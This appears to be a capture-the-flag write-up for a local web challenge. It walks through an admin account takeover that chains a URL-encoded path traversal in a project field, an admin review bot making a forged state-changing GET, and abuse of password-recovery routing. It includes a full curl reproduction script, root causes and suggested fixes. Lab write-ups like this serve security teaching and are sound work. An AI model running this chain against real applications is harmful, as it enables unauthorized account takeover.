# Dar Mohssinin Web CTF - Full Writeup

## Challenge Goal
Gain admin access, then call:

```http
GET /v1/api/capture
```

Expected final output includes:

`NSC{14h_yd3w3mh4_n34m4_lfl4g_0lm4_fl0s_lm0hss1n_k4m1n_l1ya}`

---

## TL;DR Attack Chain
1. Create a normal account.
2. Set your notification address to an internal mailbox (`@dar-lmohsinin.ma`) so tokens appear in the in-app bell.
3. Submit a project with a URL-encoded traversal payload in `preview_slug`.
4. Admin review bot decodes and resolves the slug, then performs a forged state-changing GET as admin.
5. That GET updates admin `notify_email` to your internal mailbox.
6. Trigger admin password recovery.
7. Read admin recovery token from your own notification inbox.
8. Reset admin password.
9. Login as admin and call `/v1/api/capture`.

---

## Player-Facing Recon
As a player, these behaviors stand out:

1. Projects move from `pending` to `reviewed` automatically after a short delay.
2. Notification bell only shows meaningful mail for internal addresses.
3. Account recovery sends a token and is based on `notify_email`.
4. There is an unsubscribe endpoint under account notifications that is reachable by GET.

This strongly suggests a bot + path manipulation + account-logic pivot chain.

---

## Step-by-Step Exploitation (UI + API)

## Step 0 - Create attacker account
Register and sign in as any normal user, for example:

- username: `test`
- password: `DeltaPass123!`

---

## Step 1 - Prepare an internal inbox you control
Go to `Settings -> Notification Address` and set:

```text
test@dar-lmohsinin.ma
```

Why this matters:
Internal addresses are routed to the in-app notification system, where recovery token data is visible.

Quick check:
Open the bell and verify it shows address `-> delta@dar-lmohsinin.ma`.

---

## Step 2 - Build the malicious `preview_slug`
Raw `../` is blocked, so use URL-encoded traversal:

```text
%2e%2e/%2e%2e/account/notifications/unsubscribe?email=delta%40dar-lmohsinin.ma
```

Meaning after decode + resolution:

```text
/v1/api/account/notifications/unsubscribe?email=delta@dar-lmohsinin.ma
```

---

## Step 3 - Submit project to trigger admin bot
Create a project and use the payload above as `preview_slug`.
Wait about 2-4 seconds for bot review.

Effect:
Bot is authenticated as admin and hits the forged GET endpoint, so admin `notify_email` gets changed to your internal mailbox.

---

## Step 4 - Trigger admin password recovery
Request admin recovery:

```bash
curl -i -X POST 'http://localhost:5000/v1/api/auth/recover' \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin"}'
```

Because admin notification address was hijacked in Step 3, the recovery token is routed to your mailbox.

---

## Step 5 - Retrieve admin token from your bell
Open notification bell as `delta`.
You should get a `Password Reset Requested` notification containing token details.
Copy the token.

Optional API check (session-bound mailbox only):

```bash
curl -s 'http://localhost:5000/v1/api/internal/notify/delta' \
  -b c.txt
```

Important:
This endpoint is session-authenticated and mailbox-owner checked. You can only read your own internal mailbox.

---

## Step 6 - Reset admin password

```bash
curl -i -X POST 'http://localhost:5000/v1/api/auth/recover/confirm' \
  -H 'Content-Type: application/json' \
  --data '{"token":"<ADMIN_TOKEN>","password":"H4ck3d!2024"}'
```

Expected success:

```json
{"message":"Password updated successfully. You can now sign in."}
```

---

## Step 7 - Login as admin and get flag
Sign in as:

- username: `admin`
- password: `H4ck3d!2024`

Then:

```bash
curl -s -c admin.txt -X POST 'http://localhost:5000/v1/api/auth/signin' \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"H4ck3d!2024"}'

curl -s 'http://localhost:5000/v1/api/capture' -b admin.txt
```

---

## API-First Reproduction Script
Use this if you want to reproduce most of the chain with cURL:

```bash
BASE='http://localhost:5000/v1/api'
USER='test'
PASS='DeltaPass123!'

# 1) Signup attacker
curl -s -i -c c.txt -X POST "$BASE/auth/signup" \
  -H 'Content-Type: application/json' \
  --data "{\"username\":\"$USER\",\"email\":\"$USER@x.com\",\"password\":\"$PASS\"}"

# 2) Login attacker
curl -s -i -b c.txt -c c.txt -X POST "$BASE/auth/signin" \
  -H 'Content-Type: application/json' \
  --data "{\"username\":\"$USER\",\"password\":\"$PASS\"}"

# 3) Read csrf token (requires jq)
CSRF=$(curl -s -b c.txt "$BASE/auth/whoami" | jq -r '.csrf_token')

# 4) Set internal notify mailbox
curl -s -i -b c.txt -X PATCH "$BASE/account/notifications" \
  -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $CSRF" \
  --data "{\"notify_email\":\"$USER@dar-lmohsinin.ma\"}"

# 5) Submit malicious project
curl -s -i -b c.txt -X POST "$BASE/projects" \
  -H 'Content-Type: application/json' \
  --data "{
    \"name\":\"poc\",
    \"description\":\"bot path test\",
    \"preview_slug\":\"%2e%2e/%2e%2e/account/notifications/unsubscribe?email=$USER%40dar-lmohsinin.ma\"
  }"

# 6) Wait for admin bot
sleep 4

# 7) Trigger admin recovery
curl -s -i -X POST "$BASE/auth/recover" \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin"}'

# 8) Pull token from attacker's mailbox
curl -s -b c.txt "$BASE/internal/notify/$USER"
# Copy token value from response

# 9) Use copied token to reset admin password
curl -s -i -X POST "$BASE/auth/recover/confirm" \
  -H 'Content-Type: application/json' \
  --data '{"token":"<ADMIN_TOKEN>","password":"H4ck3d!2024"}'

# 10) Login as admin
curl -s -i -c admin.txt -X POST "$BASE/auth/signin" \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"H4ck3d!2024"}'

# 11) Capture flag
curl -s -b admin.txt "$BASE/capture"
```

Then login as admin and call `/v1/api/capture`.

---

## Why This Works (Root Causes)
1. Incomplete traversal filtering:
`../` is blocked literally, but `%2e%2e/` is accepted.

2. Bot decode + URL resolution:
Bot decodes user-controlled slug then resolves against preview base, enabling path escape.

3. State-changing GET endpoint:
`/v1/api/account/notifications/unsubscribe` updates account state via GET.

4. Recovery destination is mutable:
Password reset token is sent to `notify_email`, not immutable verified email.

5. Internal mailbox exposure:
Internal notification flow includes recovery token details, making takeover practical after mailbox hijack.

---

## Notes for Challenge Hosting
This challenge is a logic chain combining:

- CSPT-style path traversal
- bot-assisted request forgery
- business-logic abuse in password recovery routing

It is not SSTI.

---

## Suggested Fixes
1. Normalize and strictly validate `preview_slug` before storage and before bot fetch.
2. Never allow state-changing GET endpoints.
3. Bind recovery to primary verified email (or require out-of-band verification).
4. Never expose raw recovery tokens in any user-accessible inbox/feed.
5. Run bot in a constrained context with strict allowlist of paths.
